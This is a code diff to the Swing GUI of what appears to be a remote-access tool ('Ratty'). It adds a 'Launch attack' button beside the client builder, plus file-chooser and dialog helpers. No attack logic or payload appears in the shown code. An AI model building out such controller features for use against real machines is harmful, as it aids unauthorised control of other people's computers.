@@ -8,17 +8,23 @@ import java.awt.event.ActionEvent;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.awt.image.BufferedImage;
+import java.io.File;
 import java.util.Arrays;
 import java.util.List;
 
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
+import javax.swing.JDialog;
+import javax.swing.JFileChooser;
 import javax.swing.JFrame;
 import javax.swing.JMenuBar;
 import javax.swing.JMenuItem;
+import javax.swing.JOptionPane;
 import javax.swing.JPopupMenu;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
+import javax.swing.filechooser.FileFilter;
+import javax.swing.filechooser.FileNameExtensionFilter;
 
 import de.sogomn.engine.fx.SpriteSheet;
 import de.sogomn.engine.util.AbstractListenerContainer;
@@ -34,7 +40,9 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	
 	private JPopupMenu menu;
 	private JMenuBar menuBar;
-	private JButton build;
+	private JButton build, attack;
+	
+	private JFileChooser fileChooser;
 	
 	private ServerClient lastServerClientClicked;
 	
@@ -57,6 +65,7 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	public static final String AUDIO = "Play audio";
 	public static final String FREE = "Free client";
 	public static final String BUILD = "Client builder";
+	public static final String ATTACK = "Launch attack";
 	
 	public static final String[] COMMANDS = {
 		POPUP,
@@ -79,6 +88,8 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> {
 		menu = new JPopupMenu();
 		menuBar = new JMenuBar();
 		build = new JButton(BUILD);
+		attack = new JButton(ATTACK);
+		fileChooser = new JFileChooser();
 		
 		for (int i = 0; i < COMMANDS.length && i < MENU_ICONS.length; i++) {
 			final String command = COMMANDS[i];
@@ -98,9 +109,12 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> {
 			}
 		};
 		
+		attack.setActionCommand(ATTACK);
+		attack.addActionListener(this::actionPerformed);
 		build.setActionCommand(BUILD);
 		build.addActionListener(this::actionPerformed);
 		menuBar.add(build);
+		menuBar.add(attack);
 		scrollPane.setBorder(null);
 		table.setComponentPopupMenu(menu);
 		table.addMouseListener(mouseAdapter);
@@ -145,6 +159,40 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	
 	public void removeRow(final ServerClient client) {
 		tableModel.removeServerClient(client);
+	}
+	
+	public void showMessage(final String message) {
+		final JOptionPane pane = new JOptionPane(message);
+		final JDialog dialog = pane.createDialog(frame, null);
+		
+		dialog.setModal(false);
+		dialog.setVisible(true);
+	}
+	
+	public File getFile(final String type) {
+		final FileFilter filter = new FileNameExtensionFilter("*." + type, type);
+		
+		fileChooser.setFileFilter(filter);
+		
+		final int input = fileChooser.showOpenDialog(frame);
+		
+		if (input == JFileChooser.APPROVE_OPTION) {
+			final File file = fileChooser.getSelectedFile();
+			
+			return file;
+		}
+		
+		return null;
+	}
+	
+	public File getFile() {
+		return getFile(null);
+	}
+	
+	public String getInput() {
+		final String input = JOptionPane.showInputDialog(frame);
+		
+		return input;
 	}
 	
 	public ServerClient getLastServerClientClicked() {
